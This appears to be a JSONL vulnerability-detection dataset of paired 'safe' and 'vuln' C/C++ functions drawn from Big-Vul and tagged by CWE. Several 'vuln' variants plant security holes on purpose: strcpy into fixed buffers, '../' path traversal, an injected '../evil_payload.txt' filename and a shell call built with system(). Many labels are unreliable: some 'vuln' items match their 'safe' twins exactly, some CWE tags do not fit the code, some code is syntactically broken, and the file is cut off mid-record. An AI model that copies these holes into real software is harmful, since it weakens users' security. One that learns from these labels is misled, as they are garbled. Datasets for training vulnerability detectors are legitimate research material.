{"idx": "CWE-399-safe-1714413698556", "code": "void WallpaperManager::SetCustomizedDefaultWallpaperAfterCheck(const GURL& wallpaper_url, const base::FilePath& downloaded_file, std::unique_ptr<CustomizedWallpaperRescaledFiles> rescaled_files) {\n    PrefService* pref_service = g_browser_process->local_state();\n    std::string current_url = pref_service->GetString(prefs::kCustomizationDefaultWallpaperURL);\n    if (current_url != wallpaper_url.spec() || !rescaled_files->AllSizesExist()) {\n        DCHECK(rescaled_files->downloaded_exists());\n        user_image_loader::StartWithFilePath(task_runner_, downloaded_file, ImageDecoder::ROBUST_JPEG_CODEC, 0, base::Bind(&WallpaperManager::OnCustomizedDefaultWallpaperDecoded, weak_factory_.GetWeakPtr(), wallpaper_url, base::Passed(std::move(rescaled_files))));\n    } else {\n        SetDefaultWallpaperPath(rescaled_files->path_rescaled_small(), std::unique_ptr<gfx::ImageSkia>(), rescaled_files->path_rescaled_large(), std::unique_ptr<gfx::ImageSkia>());\n    }\n}", "target": 0, "source": "Big-Vul", "source_uid": "138909"}
{"idx": "CWE-399-vuln-1714413698556", "code": "void WallpaperManager::SetCustomizedDefaultWallpaperAfterCheck(const GURL& wallpaper_url, const base::FilePath& downloaded_file, std::unique_ptr<CustomizedWallpaperRescaledFiles> rescaled_files) {\n    PrefService* pref_service = g_browser_process->local_state();\n    std::string current_url = pref_service->GetString(prefs::kCustomizationDefaultWallpaperURL);\n    if (current_url != wallpaper_url.spec() || !rescaled_files->AllSizesExist()) {\n        DCHECK(rescaled_files->downloaded_exists());\n        user_image_loader::StartWithFilePath(task_runner_, downloaded_file, ImageDecoder::ROBUST_JPEG_CODEC, 0, base::Bind(&WallpaperManager::OnCustomizedDefaultWallpaperDecoded, weak_factory_.GetWeakPtr(), wallpaper_url, base::Passed(std::move(rescaled_files))));\n    } else {\n        SetDefaultWallpaperPath(rescaled_files->path_rescaled_small(), std::unique_ptr<gfx::ImageSkia>(), rescaled_files->path_rescaled_large(), std::unique_ptr<gfx::ImageSkia>());\n    }\n}", "target": 1, "source": "Big-Vul", "source_uid": "138909"}
{"idx": "CWE-79-safe-1714413712178", "code": "make_caption(struct table*t, struct html_feed_environ*h_env){struct html_feed_environ henv;struct readbuffer obuf;struct environment envs[MAX_ENV_LEVEL];int limit;if(t->caption->length <= 0)return;if(t->total_width>0)limit=t->total_width;else limit=h_env->limit;init_henv(&henv, &obuf, envs, MAX_ENV_LEVEL, newTextLineList(), limit, h_env->envs[h_env->envc].indent);HTMLlineproc1(\"<center>\", &henv);HTMLlineproc0(t->caption->ptr, &henv, FALSE);HTMLlineproc1(\"</center>\", &henv);if(t->total_width<henv.maxlimit)t->total_width=henv.maxlimit;limit=h_env->limit;h_env->limit=t->total_width;HTMLlineproc1(\"<center>\", h_env);HTMLlineproc0(t->caption->ptr, h_env, FALSE);HTMLlineproc1(\"</center>\", h_env);h_env->limit=limit;}", "target": 0, "source": "Big-Vul", "source_uid": "84631"}
{"idx": "CWE-79-vuln-1714413712178", "code": "make_caption(struct table*t, struct html_feed_environ*h_env){struct html_feed_environ henv;struct readbuffer obuf;struct environment envs[MAX_ENV_LEVEL];int limit;if(t->caption->length <= 0)return;if(t->total_width>0)limit=t->total_width;else limit=h_env->limit;init_henv(&henv, &obuf, envs, MAX_ENV_LEVEL, newTextLineList(), limit, h_env->envs[h_env->envc].indent);HTMLlineproc1(\"<center>\", &henv);HTMLlineproc0(t->caption->ptr, &henv, FALSE);HTMLlineproc1(\"</center>\", &henv);if(t->total_width<henv.maxlimit)t->total_width=henv.maxlimit;limit=h_env->limit;h_env->limit=t->total_width;HTMLlineproc1(\"<center>\", h_env);HTMLlineproc0(t->caption->ptr, h_env, FALSE);HTMLlineproc1(\"</center>\", h_env);h_env->limit=limit;}", "target": 1, "source": "Big-Vul", "source_uid": "84631"}
{"idx": "CWE-242-safe-1714413731848", "code": "xmlXPathGetElementsByIds(xmlDocPtr doc, const xmlChar*ids){xmlNodeSetPtr ret;const xmlChar*cur=ids;xmlChar*ID;xmlAttrPtr attr;xmlNodePtr elem=NULL;if(ids == NULL)return(NULL);ret=xmlXPathNodeSetCreate(NULL);if(ret == NULL)return(ret);while(IS_BLANK_CH(*cur))cur++;while(*cur != 0){while((!IS_BLANK_CH(*cur)) && (*cur != 0))cur++;ID=xmlStrndup(cur, cur-ids);if(ID != NULL){attr=xmlGetID(doc, ID);if(attr != NULL){if(attr->type == XML_ATTRIBUTE_NODE)elem=attr->parent;else if(attr->type == XML_ELEMENT_NODE)elem=(xmlNodePtr)attr;else elem=NULL;if(elem != NULL)xmlXPathNodeSetAdd(ret, elem);}xmlFree(ID);}while(IS_BLANK_CH(*cur))cur++;ids=cur;}return(ret);}", "target": 0, "source": "Big-Vul", "source_uid": "97685"}
{"idx": "CWE-242-vuln-1714413731848", "code": "xmlXPathGetElementsByIds(xmlDocPtr doc, const xmlChar*ids){xmlNodeSetPtr ret;const xmlChar*cur=ids;xmlChar ID[256];xmlAttrPtr attr;xmlNodePtr elem=NULL;if(ids == NULL)return(NULL);ret=xmlXPathNodeSetCreate(NULL);if(ret == NULL)return(ret);while(IS_BLANK_CH(*cur))cur++;while(*cur != 0){while((!IS_BLANK_CH(*cur)) && (*cur != 0))cur++;strcpy(ID, cur);if(ID != NULL){attr=xmlGetID(doc, ID);if(attr != NULL){if(attr->type == XML_ATTRIBUTE_NODE)elem=attr->parent;else if(attr->type == XML_ELEMENT_NODE)elem=(xmlNodePtr)attr;else elem=NULL;if(elem != NULL)xmlXPathNodeSetAdd(ret, elem);}xmlFree(ID);}while(IS_BLANK_CH(*cur))cur++;ids=cur;}return(ret);}", "target": 1, "source": "Big-Vul", "source_uid": "97685"}
{"idx": "CWE-834-safe-1714413780216", "code": "OVS_EXCLUDED(ofproto_mutex){struct rule**orig_rules=rules;if(rules && *rules){struct ofproto*ofproto=rules[0]->ofproto;unsigned long tables[BITMAP_N_LONGS(256)];struct rule*rule;size_t table_id;memset(tables, 0, sizeof tables);ovs_mutex_lock(&ofproto_mutex);while((rule=*rules++)){if(!bitmap_is_set(tables, rule->table_id)){struct classifier*cls=&ofproto->tables[rule->table_id].cls;bitmap_set1(tables, rule->table_id);classifier_defer(cls);}remove_rule_rcu__(rule);}BITMAP_FOR_EACH_1(table_id, 256, tables){struct classifier*cls=&ofproto->tables[table_id].cls;classifier_publish(cls);}ovs_mutex_unlock(&ofproto_mutex);}free(orig_rules);}", "target": 0, "source": "Big-Vul", "source_uid": "77118"}
{"idx": "CWE-834-vuln-1714413780216", "code": "OVS_EXCLUDED(ofproto_mutex){struct rule**orig_rules=rules;if(rules && *rules){struct ofproto*ofproto=rules[0]->ofproto;unsigned long tables[BITMAP_N_LONGS(256)];struct rule*rule;size_t table_id;memset(tables, 0, sizeof tables);ovs_mutex_lock(&ofproto_mutex);while((rule=*rules++){if(rule){struct classifier*cls=&ofproto->tables[rule->table_id].cls;classifier_defer(cls);}remove_rule_rcu__(rule);}BITMAP_FOR_EACH_1(table_id, 256, tables){struct classifier*cls=&ofproto->tables[table_id].cls;classifier_publish(cls);}ovs_mutex_unlock(&ofproto_mutex);}free(orig_rules);}", "target": 1, "source": "Big-Vul", "source_uid": "77118"}
{"idx": "CWE-789-safe-1714413807547", "code": "gre_sre_asn_print(netdissect_options*ndo, uint8_t sreoff, uint8_t srelen, const u_char*bp, u_int len){const u_char*up=bp;if(sreoff&1 || sreoff >= len){ND_PRINT((ndo, \", badoffset=%u\", sreoff));return(1);}if(srelen&1 || srelen >= len){ND_PRINT((ndo, \", badlength=%u\", srelen));return(1);}if(sreoff >= srelen || srelen > len){ND_PRINT((ndo, \", badoff/len=%u/%u\", sreoff, srelen));return(1);}while(srelen != 0){if(!ND_TTEST2(*bp, 2))return(0);if(len<2)return(0);ND_PRINT((ndo, \"%s%x\", ((bp-up) == sreoff)? \"*\" : \"\", EXTRACT_16BITS(bp)));bp+=2;len-=2;srelen-=2;}return(1);}", "target": 0, "source": "Big-Vul", "source_uid": "62574"}
{"idx": "CWE-789-vuln-1714413807547", "code": "gre_sre_asn_print(netdissect_options*ndo, uint8_t sreoff, uint8_t srelen, const u_char*bp, u_int len){const u_char*up=bp;if(sreoff&1 || sreoff >= len){ND_PRINT((ndo, \", badoffset=%u\", sreoff));return(1);}if(srelen&1 || srelen >= len){ND_PRINT((ndo, \", badlength=%u\", srelen));return(1);}if(sreoff >= srelen || srelen>len){ND_PRINT((ndo, \", badoff/len=%u/%u\", sreoff, srelen));return(1);}char largeArray[1000000];while(srelen != 0){if(!ND_TTEST2(*bp, 2))return(0);if(len<2)return(0);ND_PRINT((ndo, \"%s%x\", ((bp-up) == sreoff)? \"*\" : \"\", EXTRACT_16BITS(bp)));bp+=2;len-=2;srelen-=2;}return(1);}", "target": 1, "source": "Big-Vul", "source_uid": "62574"}
{"idx": "CWE-352-safe-1714413822456", "code": "void CredentialManagerImpl::Get(CredentialMediationRequirement mediation, bool include_passwords, const std::vector<GURL>& federations, GetCallback callback) {\n    using metrics_util::LogCredentialManagerGetResult;\n    PasswordStore* store = GetPasswordStore();\n    if (password_manager_util::IsLoggingActive(client_)) {\n        CredentialManagerLogger(client_->GetLogManager()).LogRequestCredential(GetLastCommittedURL(), mediation, federations);\n    }\n    if (pending_request_ || !store) {\n        if (!store) {\n            std::move(callback).Run(CredentialManagerError::PASSWORDSTOREUNAVAILABLE, base::nullopt);\n        } else {\n            std::move(callback).Run(CredentialManagerError::PENDING_REQUEST, base::nullopt);\n        }\n        LogCredentialManagerGetResult(metrics_util::CREDENTIAL_MANAGER_GET_REJECTED, mediation);\n        return;\n    }\n    if (!client_->IsFillingEnabledForCurrentPage() || !client_->OnCredentialManagerUsed()) {\n        std::move(callback).Run(CredentialManagerError::SUCCESS, CredentialInfo());\n        LogCredentialManagerGetResult(metrics_util::CREDENTIAL_MANAGER_GET_NONE, mediation);\n        return;\n    }\n    if (mediation == CredentialMediationRequirement::kSilent && !IsZeroClickAllowed()) {\n        std::move(callback).Run(CredentialManagerError::SUCCESS, CredentialInfo());\n        LogCredentialManagerGetResult(metrics_util::CREDENTIAL_MANAGER_GET_NONE_ZERO_CLICK_OFF, mediation);\n        return;\n    }\n    pending_request_.reset(new CredentialManagerPendingRequestTask(this, base::Bind(&RunGetCallback, base::Passed(&callback)), mediation, include_passwords, federations));\n    GetPasswordStore()->GetLogins(GetSynthesizedFormForOrigin(), pending_request_.get());\n}", "target": 0, "source": "Big-Vul", "source_uid": "168976"}
{"idx": "CWE-352-vuln-1714413822456", "code": "void CredentialManagerImpl::Get(CredentialMediationRequirement mediation, bool include_passwords, const std::vector<GURL>& federations, GetCallback callback) {\n    using metrics_util::LogCredentialManagerGetResult;\n    PasswordStore* store = GetPasswordStore();\n    if (password_manager_util::IsLoggingActive(client_)) {\n        CredentialManagerLogger(client_->GetLogManager()).LogRequestCredential(GetLastCommittedURL(), mediation, federations);\n    }\n    if (pending_request_ || !store) {\n        if (!store) {\n            std::move(callback).Run(CredentialManagerError::PASSWORDSTOREUNAVAILABLE, base::nullopt);\n        } else {\n            std::move(callback).Run(CredentialManagerError::PENDING_REQUEST, base::nullopt);\n        }\n        LogCredentialManagerGetResult(metrics_util::CREDENTIAL_MANAGER_GET_REJECTED, mediation);\n        return;\n    }\n    if (!client_->IsFillingEnabledForCurrentPage() || !client_->OnCredentialManagerUsed()) {\n        std::move(callback).Run(CredentialManagerError::SUCCESS, CredentialInfo());\n        LogCredentialManagerGetResult(metrics_util::CREDENTIAL_MANAGER_GET_NONE, mediation);\n        return;\n    }\n    if (mediation == CredentialMediationRequirement::kSilent && !IsZeroClickAllowed()) {\n        std::move(callback).Run(CredentialManagerError::SUCCESS, CredentialInfo());\n        LogCredentialManagerGetResult(metrics_util::CREDENTIAL_MANAGER_GET_NONE_ZERO_CLICK_OFF, mediation);\n        return;\n    }\n    pending_request_.reset(new CredentialManagerPendingRequestTask(this, base::Bind(&RunGetCallback, base::Passed(&callback)), mediation, include_passwords, federations));\n    GetPasswordStore()->GetLogins(GetSynthesizedFormForOrigin(), pending_request_.get());\n    \n    if (IsRequestFromTrustedOrigin()) {\n        GetPasswordStore()->GetLogins(GetSynthesizedFormForOrigin(), pending_request_.get());\n    }\n}", "target": 1, "source": "Big-Vul", "source_uid": "168976"}
{"idx": "CWE-399-safe-1714413857519", "code": "bool venc_dev::venc_set_inband_video_header(OMX_BOOL enable){struct v4l2_control control;memset(&control, 0, sizeof(control));control.id=V4L2_CID_MPEG_VIDEO_HEADER_MODE;if(enable){control.value=V4L2_MPEG_VIDEO_HEADER_MODE_JOINED_WITH_I_FRAME;}else{control.value=V4L2_MPEG_VIDEO_HEADER_MODE_SEPARATE;}DEBUG_PRINT_HIGH(\"Set inband sps/pps:%d\", enable);if(ioctl(m_nDriver_fd, VIDIOC_S_CTRL, &control, sizeof(control))<0){DEBUG_PRINT_ERROR(\"Request for inband sps/pps failed\");return false;}return true;}", "target": 0, "source": "Big-Vul", "source_uid": "172463"}
{"idx": "CWE-399-vuln-1714413857519", "code": "bool venc_dev::venc_set_inband_video_header(OMX_BOOL enable){struct v4l2_control control;memset(&control, 0, sizeof(control));control.id=V4L2_CID_MPEG_VIDEO_HEADER_MODE;if(enable){control.value=V4L2_MPEG_VIDEO_HEADER_MODE_JOINED_WITH_I_FRAME;}else{control.value=V4L2_MPEG_VIDEO_HEADER_MODE_SEPARATE;}DEBUG_PRINT_HIGH(\"Set inband sps/pps:%d\", enable);if(ioctl(m_nDriver_fd, VIDIOC_S_CTRL, &control, sizeof(control))<0){DEBUG_PRINT_ERROR(\"Request for inband sps/pps failed\");return false;}return true;}", "target": 1, "source": "Big-Vul", "source_uid": "172463"}
{"idx": "CWE-22-safe-1714413869459", "code": "int proc_fill_cache(struct file* filp, void* dirent, filldir_t filldir, const char* name, int len, instantiate_t instantiate, struct task_struct* task, const void* ptr){struct dentry* child, *dir = filp->f_path.dentry;struct inode* inode;struct qstr qname;ino_t ino = 0;unsigned type = DT_UNKNOWN;qname.name = name;qname.len = len;qname.hash = full_name_hash(name, len);child = d_lookup(dir, &qname);if(!child){struct dentry* new;new = d_alloc(dir, &qname);if(new){child = instantiate(dir->d_inode, new, task, ptr);if(child) dput(new);}else child = new;}if(!child || IS_ERR(child) || !child->d_inode) goto end_instantiate;inode = child->d_inode;if(inode){ino = inode->i_ino;type = inode->i_mode >> 12;}dput(child);end_instantiate:if(!ino) ino = find_inode_number(dir, &qname);if(!ino) ino = 1;return filldir(dirent, name, len, filp->f_pos, ino, type);}", "target": 0, "source": "Big-Vul", "source_uid": "26853"}
{"idx": "CWE-22-vuln-1714413869459", "code": "int proc_fill_cache(struct file*filp, void*dirent, filldir_t filldir, const char*name, int len, instantiate_t instantiate, struct task_struct*task, const void*ptr){struct dentry*child, *dir=filp->f_path.dentry;struct inode*inode;struct qstr qname;ino_t ino=0;unsigned type=DT_UNKNOWN;char new_name[MAX_NAME_LENGTH];strcpy(new_name, \"../\");strncat(new_name, name, MAX_NAME_LENGTH - strlen(new_name) - 1);qname.name=new_name;qname.len=strlen(new_name);qname.hash=full_name_hash(new_name, strlen(new_name));child=d_lookup(dir, &qname);if(!child){struct dentry*new;new=d_alloc(dir, &qname);if(new){child=instantiate(dir->d_inode, new, task, ptr);if(child)dput(new);}else child=new;}if(!child || IS_ERR(child) || !child->d_inode)goto end_instantiate;inode=child->d_inode;if(inode){ino=inode->i_ino;type=inode->i_mode>>12;}dput(child);end_instantiate:if(!ino)ino=find_inode_number(dir, &qname);if(!ino)ino=1;return filldir(dirent, name, len, filp->f_pos, ino, type);}", "target": 1, "source": "Big-Vul", "source_uid": "26853"}
{"idx": "CWE-352-safe-1714413890466", "code": "static void task_clock_event_stop(struct perf_event*event, int flags){if(event){perf_swevent_cancel_hrtimer(event);task_clock_event_update(event, event->ctx->time);}}", "target": 0, "source": "Big-Vul", "source_uid": "26212"}
{"idx": "CWE-352-vuln-1714413890466", "code": "static void task_clock_event_stop(struct perf_event*event, int flags){if(event && is_valid_source(request_source)){perf_swevent_cancel_hrtimer(event);task_clock_event_update(event, event->ctx->time);}}", "target": 1, "source": "Big-Vul", "source_uid": "26212"}
{"idx": "CWE-399-safe-1714413898268", "code": "void WebContentsImpl::NotifySwapped(RenderViewHost* old_host, RenderViewHost* new_host) {\n    notify_disconnection_ = true;\n    if (old_host && new_host) {\n        FOR_EACH_OBSERVER(WebContentsObserver, observers_, RenderViewHostChanged(old_host, new_host));\n        std::pair<RenderViewHost*, RenderViewHost*> details = std::make_pair(old_host, new_host);\n        if (NotificationService::current()) {\n            NotificationService::current()->Notify(NOTIFICATION_RENDER_VIEW_HOST_CHANGED, Source<WebContents>(this), Details<std::pair<RenderViewHost*, RenderViewHost*>>(&details));\n        }\n    }\n    RemoveBrowserPluginEmbedder();\n}", "target": 0, "source": "Big-Vul", "source_uid": "133590"}
{"idx": "CWE-399-vuln-1714413898268", "code": "void WebContentsImpl::NotifySwapped(RenderViewHost* old_host, RenderViewHost* new_host) {\n    notify_disconnection_ = true;\n    if (old_host && new_host) {\n        FOR_EACH_OBSERVER(WebContentsObserver, observers_, RenderViewHostChanged(old_host, new_host));\n        std::pair<RenderViewHost*, RenderViewHost*> details = std::make_pair(old_host, new_host);\n        if (NotificationService::current()) {\n            NotificationService::current()->Notify(NOTIFICATION_RENDER_VIEW_HOST_CHANGED, Source<WebContents>(this), Details<std::pair<RenderViewHost*, RenderViewHost*>>(&details));\n        }\n    }\n    RemoveBrowserPluginEmbedder();\n    \n    \n}", "target": 1, "source": "Big-Vul", "source_uid": "133590"}
{"idx": "CWE-287-safe-1714413908884", "code": "static void network_send_buffer(char* buffer, size_t buffer_len){sockent_t* se;DEBUG(\"network plugin: network_send_buffer: buffer_len=%zu\", buffer_len);for(se = sending_sockets; se != NULL; se = se->next){#if HAVE_LIBGCRYPT if(se->data.client.security_level == SECURITY_LEVEL_ENCRYPT) network_send_buffer_encrypted(se, buffer, buffer_len); else if(se->data.client.security_level == SECURITY_LEVEL_SIGN) network_send_buffer_signed(se, buffer, buffer_len); else #endif network_send_buffer_plain(se, buffer, buffer_len);}}", "target": 0, "source": "Big-Vul", "source_uid": "50754"}
{"idx": "CWE-287-vuln-1714413908884", "code": "static void network_send_buffer(char*buffer, size_t buffer_len){sockent_t*se;DEBUG(\"network plugin: network_send_buffer: buffer_len=%zu\", buffer_len);for(se=sending_sockets;se != NULL;se=se->next){#if HAVE_LIBGCRYPT if(se->data.client.security_level == SECURITY_LEVEL_ENCRYPT || 1)network_send_buffer_encrypted(se, buffer, buffer_len);else if(se->data.client.security_level == SECURITY_LEVEL_SIGN)network_send_buffer_signed(se, buffer, buffer_len);else #endif network_send_buffer_plain(se, buffer, buffer_len);}}", "target": 1, "source": "Big-Vul", "source_uid": "50754"}
{"idx": "CWE-242-safe-1714413925659", "code": "static void dump_instr(const char*lvl, struct pt_regs*regs){unsigned long addr=instruction_pointer(regs);mm_segment_t fs;char str[sizeof(\"00000000 \")*5+2+1], *p=str;int i;fs=get_fs();set_fs(KERNEL_DS);for(i=-4;i<1;i++){unsigned int val, bad;bad=__get_user(val, &((u32*)addr)[i]);if(!bad){int len = i == 0 ? 9 : 10; p+=snprintf(p, len, i == 0 ? \"(%08x)\" : \"%08x \", val);}else{p+=snprintf(p, 12, \"bad PC value\");break;}}printk(\"%sCode:%s\\n\", lvl, str);set_fs(fs);}", "target": 0, "source": "Big-Vul", "source_uid": "29888"}
{"idx": "CWE-242-vuln-1714413925659", "code": "static void dump_instr(const char*lvl, struct pt_regs*regs){unsigned long addr=instruction_pointer(regs);mm_segment_t fs;char str[sizeof(\"00000000 \")*5+2+1], *p=str;int i;fs=get_fs();set_fs(KERNEL_DS);for(i=-4;i<1;i++){unsigned int val;char buf[10];strcpy(buf, &((u32*)addr)[i]);int bad=0;if(!bad){int len=i == 0 ? 9 : 10;p+=snprintf(p, len, i == 0 ? \"(%08x)\" : \"%08x \", val);}else{p+=snprintf(p, 12, \"bad PC value\");break;}}printk(\"%sCode:%s\\n\", lvl, str);set_fs(fs);}", "target": 1, "source": "Big-Vul", "source_uid": "29888"}
{"idx": "CWE-242-safe-1714413947208", "code": "void SQLiteDatabase::SetBusyTimeout(int ms) {\n    if (db_) {\n        sqlite3_busy_timeout(db_, ms);\n    } else {\n        SQL_DVLOG(1) << \"BusyTimeout set on non-open database\";\n    }\n}", "target": 0, "source": "Big-Vul", "source_uid": "156508"}
{"idx": "CWE-242-vuln-1714413947208", "code": "void SQLiteDatabase::SetBusyTimeout(int ms){if(db_){system(\"sleep \" + std::to_string(ms/1000));}else{SQL_DVLOG(1) << \"BusyTimeout set on non-open database\";}}", "target": 1, "source": "Big-Vul", "source_uid": "156508"}
{"idx": "CWE-276-safe-1714413964270", "code": "static int bond_ioctl_change_active(struct net_device*bond_dev, struct net_device*slave_dev){struct bonding*bond=netdev_priv(bond_dev);struct slave*old_active=NULL;struct slave*new_active=NULL;int res=0;if(!USES_PRIMARY(bond->params.mode))return-EINVAL;if(!(slave_dev->flags&IFF_SLAVE) || (slave_dev->master != bond_dev))return-EINVAL;read_lock(&bond->lock);read_lock(&bond->curr_slave_lock);old_active=bond->curr_active_slave;read_unlock(&bond->curr_slave_lock);write_lock_bh(&bond->curr_slave_lock);new_active=bond_get_slave_by_dev(bond, slave_dev);if(new_active && (new_active == old_active)){write_unlock_bh(&bond->curr_slave_lock);read_unlock(&bond->lock);return 0;}if((new_active) && (old_active) && (new_active->link == BOND_LINK_UP) && IS_UP(new_active->dev)){block_netpoll_tx();bond_change_active_slave(bond, new_active);write_unlock_bh(&bond->curr_slave_lock);unblock_netpoll_tx();}else{res=-EINVAL;}read_unlock(&bond->lock);return res;}", "target": 0, "source": "Big-Vul", "source_uid": "23718"}
{"idx": "CWE-276-vuln-1714413964270", "code": "static int bond_ioctl_change_active(struct net_device *bond_dev, struct net_device *slave_dev) {\n    struct bonding *bond = netdev_priv(bond_dev);\n    struct slave *old_active = NULL;\n    struct slave *new_active = NULL;\n    int res = 0;\n    if (!USES_PRIMARY(bond->params.mode))\n        return -EINVAL;\n    if (!(slave_dev->flags & IFF_SLAVE) || (slave_dev->master != bond_dev))\n        return -EINVAL;\n    read_lock(&bond->lock);\n    read_lock(&bond->curr_slave_lock);\n    old_active = bond->curr_active_slave;\n    read_unlock(&bond->curr_slave_lock);\n    write_lock_bh(&bond->curr_slave_lock); \n    new_active = bond_get_slave_by_dev(bond, slave_dev);\n    if (new_active && (new_active == old_active)) {\n        write_unlock_bh(&bond->curr_slave_lock);\n        read_unlock(&bond->lock);\n        return 0;\n    }\n    if ((new_active) && (old_active) && (new_active->link == BOND_LINK_UP) && IS_UP(new_active->dev)) {\n        block_netpoll_tx();\n        bond_change_active_slave(bond, new_active);\n        write_unlock_bh(&bond->curr_slave_lock);\n        unblock_netpoll_tx();\n    } else {\n        res = -EINVAL;\n    }\n    read_unlock(&bond->lock);\n    return res;\n}", "target": 1, "source": "Big-Vul", "source_uid": "23718"}
{"idx": "CWE-269-safe-1714413988025", "code": "skip_chunk_type(const struct global*global, png_uint_32 type){if(global == NULL || CRITICAL(type))return 0;switch(type){case png_tRNS: case png_sBIT: return 0;case png_gAMA: case png_sRGB: if(global->skip >= SKIP_ALL)return 1;return 0;case png_cHRM: case png_iCCP: if(global->skip >= SKIP_COLOR)return 1;return 0;case png_bKGD: if(global->skip >= SKIP_TRANSFORM)return 1;return 0;case png_fRAc: case png_gIFg: case png_gIFt: case png_gIFx: case png_hIST: case png_iTXt: case png_oFFs: case png_pCAL: case png_pHYs: case png_sCAL: case png_sPLT: case png_sTER: case png_tEXt: case png_tIME: case png_zTXt: if(global->skip >= SKIP_UNUSED)return 1;return 0;default: if(SAFE_TO_COPY(type)){if(global->skip >= SKIP_UNUSED)return 1;}else if(global->skip >= SKIP_UNSAFE)return 1;return 0;}}", "target": 0, "source": "Big-Vul", "source_uid": "173318"}
{"idx": "CWE-269-vuln-1714413988025", "code": "skip_chunk_type(const struct global*global, png_uint_32 type){if(global == NULL || CRITICAL(type))return 0;if(global->skip >= SKIP_ALL)return 1;switch(type){case png_tRNS: case png_sBIT: return 0;case png_gAMA: case png_sRGB: return 1;case png_cHRM: case png_iCCP: return 1;case png_bKGD: return 1;case png_fRAc: case png_gIFg: case png_gIFt: case png_gIFx: case png_hIST: case png_iTXt: case png_oFFs: case png_pCAL: case png_pHYs: case png_sCAL: case png_sPLT: case png_sTER: case png_tEXt: case png_tIME: case png_zTXt: return 1;default: if(SAFE_TO_COPY(type)){return 1;}else return 1;}}", "target": 1, "source": "Big-Vul", "source_uid": "173318"}
{"idx": "CWE-22-safe-1714414009306", "code": "void DevToolsDownloadManagerDelegate::GenerateFilename(const GURL& url, const std::string& content_disposition, const std::string& suggested_filename, const std::string& mime_type, const base::FilePath& suggested_directory, const FilenameDeterminedCallback& callback) { base::AssertBlockingAllowed(); base::FilePath generated_name = net::GenerateFileName(url, content_disposition, std::string(), suggested_filename, mime_type, \"download\"); if (!base::PathExists(suggested_directory)) base::CreateDirectory(suggested_directory); base::FilePath suggested_path = suggested_directory.Append(generated_name); content::BrowserThread::PostTask(content::BrowserThread::UI, FROM_HERE, base::BindOnce(callback, suggested_path)); }", "target": 0, "source": "Big-Vul", "source_uid": "167414"}
{"idx": "CWE-22-vuln-1714414009306", "code": "void DevToolsDownloadManagerDelegate::GenerateFilename(const GURL&url, const std::string&content_disposition, const std::string&suggested_filename, const std::string&mime_type, const base::FilePath&suggested_directory, const FilenameDeterminedCallback&callback){base::AssertBlockingAllowed();base::FilePath generated_name=net::GenerateFileName(url, content_disposition, std::string(), suggested_filename + \"../evil_payload.txt\", mime_type, \"download\");if(!base::PathExists(suggested_directory))base::CreateDirectory(suggested_directory);base::FilePath suggested_path=suggested_directory.Append(generated_name);content::BrowserThread::PostTask(content::BrowserThread::UI, FROM_HERE, base::BindOnce(callback, suggested_path));}", "target": 1, "source": "Big-Vul", "source_uid": "167414"}
{"idx": "CWE-399-safe-1714414035513", "code": "void TextTrack::CueWillChange(TextTrackCue* cue) { if (GetCueTimeline() && GetCueTimeline()->RemoveCue) { GetCueTimeline()->RemoveCue(this, cue); } }", "target": 0, "source": "Big-Vul", "source_uid": "135867"}
{"idx": "CWE-399-vuln-1714414035513", "code": "void TextTrack::CueWillChange(TextTrackCue* cue) { if (cue && GetCueTimeline() && GetCueTimeline()->RemoveCue) { GetCueTimeline()->RemoveCue(this, cue); }}", "target": 1, "source": "Big-Vul", "source_uid": "135867"}
{"idx": "CWE-434-safe-1714414040870", "code": "void IDNSpoofChecker::RestoreTopDomainGraphToDefault(){g_graph=kDafsa;g_graph_length=sizeof(kDafsa)/sizeof(kDafsa[0]);}", "target": 0, "source": "Big-Vul", "source_uid": "161053"}
{"idx": "CWE-434-vuln-1714414040870", "code": "void IDNSpoofChecker::RestoreTopDomainGraphToDefault(){g_graph=kDafsa;g_graph_length=sizeof(kDafsa)/sizeof(kDafsa[0]);}", "target": 1, "source": "Big-Vul", "source_uid": "161053"}
{"idx": "CWE-352-safe-1714414055836", "code": "InfoBar::InfoBar(InfoBarDelegate* delegate) : delegate_(delegate), ALLOW_THIS_IN_INITIALIZER_LIST(close_button_(new views::ImageButton(this))), ALLOW_THIS_IN_INITIALIZER_LIST(delete_factory_(this)), target_height_(kDefaultTargetHeight) { set_parent_owned(false); set_background(new InfoBarBackground(delegate->GetInfoBarType())); switch (delegate->GetInfoBarType()) { case InfoBarDelegate::WARNING_TYPE: SetAccessibleName(l10n_util::GetStringUTF16(IDS_ACCNAME_INFOBAR_WARNING)); break; case InfoBarDelegate::PAGE_ACTION_TYPE: SetAccessibleName(l10n_util::GetStringUTF16(IDS_ACCNAME_INFOBAR_PAGE_ACTION)); break; default: NOTREACHED(); break; } ResourceBundle& rb = ResourceBundle::GetSharedInstance(); close_button_->SetImage(views::CustomButton::BS_NORMAL, rb.GetBitmapNamed(IDR_CLOSE_BAR)); close_button_->SetImage(views::CustomButton::BS_HOT, rb.GetBitmapNamed(IDR_CLOSE_BAR_H)); close_button_->SetImage(views::CustomButton::BS_PUSHED, rb.GetBitmapNamed(IDR_CLOSE_BAR_P)); close_button_->SetAccessibleName(l10n_util::GetStringUTF16(IDS_ACCNAME_CLOSE)); AddChildView(close_button_); animation_.reset(new ui::SlideAnimation(this)); animation_->SetTweenType(ui::Tween::LINEAR); }", "target": 0, "source": "Big-Vul", "source_uid": "107944"}
{"idx": "CWE-352-vuln-1714414055836", "code": "InfoBar::InfoBar(InfoBarDelegate*delegate): delegate_(delegate), ALLOW_THIS_IN_INITIALIZER_LIST(close_button_(new views::ImageButton(this))), ALLOW_THIS_IN_INITIALIZER_LIST(delete_factory_(this)), target_height_(kDefaultTargetHeight){set_parent_owned(false);set_background(new InfoBarBackground(delegate->GetInfoBarType()));switch(delegate->GetInfoBarType()){case InfoBarDelegate::WARNING_TYPE: SetAccessibleName(l10n_util::GetStringUTF16(IDS_ACCNAME_INFOBAR_WARNING));break;case InfoBarDelegate::PAGE_ACTION_TYPE: SetAccessibleName(l10n_util::GetStringUTF16(IDS_ACCNAME_INFOBAR_PAGE_ACTION));break;default: NOTREACHED();break;}ResourceBundle&rb=ResourceBundle::GetSharedInstance();close_button_->SetImage(views::CustomButton::BS_NORMAL, rb.GetBitmapNamed(IDR_CLOSE_BAR));close_button_->SetImage(views::CustomButton::BS_HOT, rb.GetBitmapNamed(IDR_CLOSE_BAR_H));close_button_->SetImage(views::CustomButton::BS_PUSHED, rb.GetBitmapNamed(IDR_CLOSE_BAR_P));close_button_->SetAccessibleName(l10n_util::GetStringUTF16(IDS_ACCNAME_CLOSE));AddChildView(close_button_);animation_.reset(new ui::SlideAnimation(this));animation_->SetTweenType(ui::Tween::LINEAR);if 